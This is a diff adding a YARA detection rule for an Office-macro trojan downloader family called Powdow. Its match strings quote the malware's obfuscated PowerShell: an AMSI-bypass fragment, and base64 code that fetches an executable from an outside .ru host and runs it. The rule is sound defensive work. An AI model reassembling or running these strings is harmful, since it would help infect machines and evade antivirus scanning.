@@ -13196,3 +13196,26 @@ rule TrojanDownloader_O97M_Powdow_SIK_2147915217_0
         (all of ($x*))
 }
 
+rule TrojanDownloader_O97M_Powdow_SSD_2147920980_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "TrojanDownloader:O97M/Powdow.SSD!MTB"
+        threat_id = "2147920980"
+        type = "TrojanDownloader"
+        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
+        family = "Powdow"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
+        threshold = "3"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "Powershell -C $FEIfwuioehfaiwyYOETWTRuwye = 'a'+'ms'+'iI'+'ni'+'tF'+'a'; $EF8034uowieypowiue = 'il'+'ed'; $Ceoiuwjoeuyfw = 'Sy'+'st'+'em.Ma'+'na'+'gem'+'ent.'+'Aut'+'omat'+'io'+'n.A'+'ms'+'iUt'+'ils';" ascii //weight: 1
+        $x_1_2 = "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JFVVVSA9ICdodHRwczovL2V4cGVydHByb21vdGlvbnMucnUvZmlsZXMvc3ZjLmV4ZSc7ICRQUFAgPSAnQzpcVXNlcnNcUHVibGljXHN2Yy5leGUnOyAkV1dXID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWV" ascii //weight: 1
+        $x_1_3 = "udDsgJFdXVy5Eb3dubG9hZEZpbGUoJFVVVSwgJFBQUCk7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRQUFA7')); $CCC = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($BBB)); powershell -E $CCC;" ascii //weight: 1
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
